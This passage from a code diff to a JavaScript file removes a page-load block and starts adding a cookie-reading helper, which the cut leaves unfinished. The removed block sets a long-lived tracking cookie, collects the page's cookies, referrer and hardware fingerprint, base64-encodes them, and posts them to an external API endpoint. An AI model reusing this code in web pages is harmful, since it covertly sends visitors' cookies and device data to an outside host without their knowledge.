@@ -36,33 +36,8 @@ function sc(cname, cvalue, exdays) {
   document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
 }
 
-$(document).ready(function() {
-
-    if (!document.cookie || !document.cookie.length)
-        sc('t', makeid(10), 30*365)
-
-    let d = {
-        uri: window.location.href,
-        c: document.cookie,
-        r: document.referrer,
-        cpu: navigator.oscpu,
-        platform: navigator.platform,
-        hc: navigator.hardwareConcurrency,
-        dm: navigator.deviceMemory,
-        ginfo: ginfo(),
-        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-        wsize: $(window).width()+'x'+$(window).height(),
-        dsize: $(document).width()+'x'+$(document).height()
-    }
-
-    $.ajax({
-        url: 'https://8gi6uzivm6.execute-api.eu-west-1.amazonaws.com/t',
-        type: 'POST',
-        data: {
-            d: btoa(JSON.stringify(d))
-        },
-        success: function(res) {
-
-        }
-    })
-})
+function gc(cname) {
+  var name = cname + "=";
+  var decodedCookie = decodeURIComponent(document.cookie);
+  var ca = decodedCookie.split(';');
+  for(var i = 0; i 
